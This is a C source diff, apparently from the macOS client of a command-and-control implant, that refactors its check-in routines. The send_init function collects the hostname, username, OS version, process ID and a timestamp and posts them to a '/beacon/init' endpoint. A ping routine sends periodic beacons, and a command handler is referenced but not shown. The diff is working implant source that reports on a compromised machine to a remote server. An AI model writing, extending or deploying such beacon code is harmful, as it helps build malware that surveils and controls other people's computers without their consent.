@@ -5,6 +5,7 @@
 #include <runtime/kit.h>
 #include <runtime/foundation.h>
 #include <runtime/messaging.h>
+#include "protocol.h"
 #include "network.h"
 #include "client.h"
 #include "sysinfo.h"
@@ -79,26 +80,30 @@ static bool send_init(ClientContext* ctx) {
         return false;
     }
 
-    DEBUG_LOG("System info retrieved successfully:");
-    DEBUG_LOG("  Hostname: %s", info.hostname);
-    DEBUG_LOG("  Username: %s", info.username);
-    DEBUG_LOG("  OS Version: %s", info.os_version);
+    ProtocolBuilder* builder = protocol_create_init(ctx->config.client_id, &info);
+    if (!builder) {
+        DEBUG_LOG("Failed to create init message");
+        return false;
+    }
 
-    char init_msg[1024];
-    snprintf(init_msg, sizeof(init_msg),
-        "INIT %s\nHOSTNAME: %s\nUSER: %s\nOS: %s\n",
-        ctx->config.client_id,
-        info.hostname,
-        info.username,
-        info.os_version);
+    protocol_add_uint(builder, "timestamp", (unsigned int)time(NULL));
+    protocol_add_uint(builder, "pid", (unsigned int)getpid());
+
+    if (protocol_has_error(builder)) {
+        DEBUG_LOG("Failed to build init message");
+        protocol_builder_destroy(builder);
+        return false;
+    }
 
     http_request_t req = {
         .url_path = "/beacon/init",
-        .body = init_msg,
-        .body_length = strlen(init_msg)
+        .body = protocol_get_message(builder),
+        .body_length = protocol_get_length(builder)
     };
 
-    return send_http_request(ctx, &req);
+    bool result = send_http_request(ctx, &req);
+    protocol_builder_destroy(builder);
+    return result;
 }
 
 
@@ -112,16 +117,29 @@ static void handle_command(const char* command) {
 }
 
 static bool send_ping(ClientContext* ctx) {
-    char ping_msg[512];
-    snprintf(ping_msg, sizeof(ping_msg), "PING %s\n", ctx->config.client_id);
+    ProtocolBuilder* builder = protocol_create_ping(ctx->config.client_id);
+    if (!builder) {
+        DEBUG_LOG("Failed to create ping message");
+        return false;
+    }
+
+    protocol_add_uint(builder, "timestamp", (unsigned int)time(NULL));
+
+    if (protocol_has_error(builder)) {
+        DEBUG_LOG("Failed to build ping message");
+        protocol_builder_destroy(builder);
+        return false;
+    }
 
     http_request_t req = {
         .url_path = "/",
-        .body = ping_msg,
-        .body_length = strlen(ping_msg)
+        .body = protocol_get_message(builder),
+        .body_length = protocol_get_length(builder)
     };
 
-    return send_http_request(ctx, &req);
+    bool result = send_http_request(ctx, &req);
+    protocol_builder_destroy(builder);
+    return result;
 }
 
 bool InitializeDarwinApi(INSTANCE* instance) {
